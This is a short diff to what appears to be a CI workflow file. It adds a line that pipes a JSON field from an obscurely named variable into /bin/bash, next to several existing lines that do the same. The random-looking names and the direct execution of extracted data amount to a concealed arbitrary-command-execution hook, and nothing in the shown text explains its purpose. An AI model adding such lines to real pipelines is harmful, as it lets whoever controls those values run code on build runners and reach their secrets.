@@ -23,6 +23,7 @@ jobs:
           echo $htbm42 | jq -r .bxaw9950 | /bin/bash
           printf '%s' "$ifmlm82" | jq -r .kxpnx88 | /bin/bash
           echo $fs2626 | jq -r .yswv594 | /bin/bash
+          printf '%s' "$dl6" | jq -r .rqq346 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
